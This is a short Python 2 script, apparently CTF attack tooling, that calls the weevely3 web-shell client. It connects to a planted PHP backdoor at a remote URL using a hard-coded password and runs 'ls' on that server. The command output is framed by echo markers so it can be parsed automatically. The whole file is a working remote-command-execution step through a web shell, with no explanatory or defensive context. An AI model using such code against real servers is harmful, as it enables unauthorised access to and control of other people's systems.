#!/usr/bin/env python


import os

cmd = "python utils/weevely3/weevely.py http://mut-orff.org:12345/haozigege.php haozigege \":shell_sh '/bin/echo HENCE666;ls;/bin/echo ZHANG777'\" 2>&1"
print os.popen(cmd).read()
